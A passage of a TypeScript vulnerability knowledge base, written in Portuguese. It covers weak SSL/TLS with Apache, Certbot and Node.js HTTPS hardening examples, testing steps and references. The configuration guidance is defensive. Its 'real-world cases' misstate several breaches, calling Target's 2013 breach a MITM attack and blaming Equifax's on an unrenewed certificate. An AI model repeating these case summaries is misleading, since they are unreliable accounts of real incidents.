    DocumentRoot /var/www/html
</VirtualHost>`,
        after: `# ✅ SEGURO
# Redireciona HTTP → HTTPS
<VirtualHost *:80>
    ServerName loja.com
    Redirect permanent / https://loja.com/
</VirtualHost>

# HTTPS
<VirtualHost *:443>
    ServerName loja.com
    DocumentRoot /var/www/html
    
    # SSL
    SSLEngine on
    SSLCertificateFile /etc/letsencrypt/live/loja.com/fullchain.pem
    SSLCertificateKeyFile /etc/letsencrypt/live/loja.com/privkey.pem
    
    # Protocolos seguros
    SSLProtocol -all +TLSv1.2 +TLSv1.3
    
    # Ciphers seguros
    SSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256
    SSLHonorCipherOrder on
    
    # HSTS
    Header always set Strict-Transport-Security "max-age=63072000; includeSubDomains; preload"
    
    # OCSP Stapling
    SSLUseStapling on
    SSLStaplingCache "shmcb:logs/ssl_stapling(32768)"
</VirtualHost>`,
      },
      {
        language: 'bash',
        label: 'Instalar Let\'s Encrypt (Certbot)',
        after: `#!/bin/bash
# ═══════════════════════════════════════════════════════
# INSTALAÇÃO AUTOMÁTICA DE CERTIFICADO SSL GRATUITO
# ═══════════════════════════════════════════════════════

# 1. Instalar Certbot
sudo apt update
sudo apt install certbot python3-certbot-nginx -y

# 2. Obter certificado (Nginx)
sudo certbot --nginx -d loja.com -d www.loja.com

# Ou para Apache:
# sudo certbot --apache -d loja.com -d www.loja.com

# 3. Testar renovação automática
sudo certbot renew --dry-run

# 4. Configurar renovação automática (cron)
echo "0 0,12 * * * root certbot renew --quiet" | sudo tee -a /etc/crontab

# 5. Verificar certificado
sudo certbot certificates

# ═══════════════════════════════════════════════════════
# TESTAR CONFIGURAÇÃO SSL
# ═══════════════════════════════════════════════════════

# Teste online (SSL Labs)
# https://www.ssllabs.com/ssltest/analyze.html?d=loja.com

# Teste local
openssl s_client -connect loja.com:443 -servername loja.com

# Verificar HSTS
curl -I https://loja.com | grep -i strict`,
      },
      {
        language: 'node-express',
        label: 'Node.js - Force HTTPS',
        after: `// ✅ FORÇAR HTTPS EM NODE.JS
const express = require('express');
const helmet = require('helmet');
const https = require('https');
const http = require('http');
const fs = require('fs');

const app = express();

// Middleware para redirecionar HTTP → HTTPS
app.use((req, res, next) => {
  if (req.secure || req.headers['x-forwarded-proto'] === 'https') {
    return next();
  }
  res.redirect(301, \`https://\${req.headers.host}\${req.url}\`);
});

// Helmet com HSTS
app.use(helmet.hsts({
  maxAge: 63072000, // 2 anos
  includeSubDomains: true,
  preload: true
}));

// Cookies seguros
app.use(require('cookie-session')({
  name: 'session',
  secret: process.env.SESSION_SECRET,
  secure: true, // Apenas HTTPS
  httpOnly: true,
  sameSite: 'strict'
}));

// Certificados SSL
const options = {
  key: fs.readFileSync('/etc/letsencrypt/live/loja.com/privkey.pem'),
  cert: fs.readFileSync('/etc/letsencrypt/live/loja.com/fullchain.pem')
};

// Servidor HTTPS
https.createServer(options, app).listen(443);

// Servidor HTTP (apenas para redirect)
http.createServer(app).listen(80);`,
      },
    ],
    testingSteps: [
      '1. Testar com SSL Labs: https://www.ssllabs.com/ssltest/ (meta: A+)',
      '2. Verificar se HTTP redireciona para HTTPS',
      '3. Testar HSTS: curl -I https://seusite.com | grep -i strict',
      '4. Verificar certificado no navegador (cadeado verde)',
      '5. Testar em diferentes navegadores',
      '6. Verificar se cookies têm flag Secure',
      '7. Testar com testssl.sh: https://testssl.sh/',
      '8. Verificar validade do certificado',
      '9. Testar renovação automática',
      '10. Monitorar com https://www.hardenize.com/',
    ],
    preventionTips: [
      '• Use HTTPS em 100% do site (sem exceções)',
      '• Implemente HSTS com preload',
      '• Use apenas TLS 1.2 e 1.3',
      '• Desabilite protocolos antigos (SSLv3, TLS 1.0, TLS 1.1)',
      '• Use ciphers fortes (AES-GCM)',
      '• Configure renovação automática do certificado',
      '• Monitore validade do certificado (alertas)',
      '• Use OCSP Stapling',
      '• Configure cookies com flag Secure',
      '• Teste regularmente com SSL Labs',
      '• Considere Certificate Transparency',
      '• Implemente CAA DNS records',
    ],
  },

  references: {
    cveIds: ['CVE-2014-0160', 'CVE-2014-3566', 'CVE-2016-2107'],
    owaspLinks: [
      'https://owasp.org/www-community/controls/Certificate_and_Public_Key_Pinning',
      'https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html',
    ],
    articles: [
      'https://letsencrypt.org/getting-started/',
      'https://www.ssllabs.com/projects/best-practices/',
      'https://developer.mozilla.org/en-US/docs/Web/Security/Transport_Layer_Security',
      'https://www.acunetix.com/blog/articles/tls-ssl-cipher-hardening/',
    ],
    videos: [
      'https://www.youtube.com/watch?v=T4Df5_cojAs',
    ],
    realWorldCases: [
      {
        company: 'Equifax',
        year: 2017,
        summary: '147 milhões de usuários afetados. Falha em renovar certificado SSL expôs dados sensíveis. Multa: US$ 700 milhões',
        link: 'https://www.ftc.gov/enforcement/cases-proceedings/refunds/equifax-data-breach-settlement',
      },
      {
        company: 'Yahoo',
        year: 2014,
        summary: '500 milhões de contas comprometidas devido a falhas de criptografia. Venda para Verizon perdeu US$ 350 milhões',
        link: 'https://www.verizon.com/about/news/yahoo-provides-notice-cyber-incident',
      },
      {
        company: 'Target',
        year: 2013,
        summary: '40 milhões de cartões roubados via MITM. Prejuízo: US$ 18.5 milhões em acordo',
        link: 'https://www.ftc.gov/news-events/news/press-releases/2017/05/target-pay-185-million-2013-data-breach-affected-consumers',
      },
    ],
  },
};

// Mapeamento de tipos de vulnerabilidade para knowledge base
export const VULNERABILITY_KNOWLEDGE_MAP: Record<string, VulnerabilityKnowledge> = {
  xss: XSS_KNOWLEDGE,
  clickjacking: CLICKJACKING_KNOWLEDGE,
  weak_ssl: SSL_KNOWLEDGE,
  missing_header: XSS_KNOWLEDGE, // Usar XSS como padrão para headers ausentes
};

export function getVulnerabilityKnowledge(type: VulnerabilityType): VulnerabilityKnowledge | undefined {
  return VULNERABILITY_KNOWLEDGE_MAP[type];
}
